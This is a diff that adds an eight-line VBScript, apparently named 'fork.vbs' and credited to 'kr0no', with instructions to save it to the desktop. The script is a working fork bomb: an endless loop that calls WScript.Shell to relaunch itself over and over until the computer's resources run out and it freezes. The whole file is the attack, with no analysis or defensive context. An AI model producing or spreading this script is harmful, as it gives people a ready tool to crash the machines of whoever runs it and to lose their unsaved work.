@@ -1,0 +1,8 @@
+
+rem  coded by kr0no 
+rem  save as "fork.vbs" and save it to desktop or anywhere;`
+dim osf
+set osf = wscript.createobject("wscript.shell")
+do
+osf.run "fork.vbs"
+loop
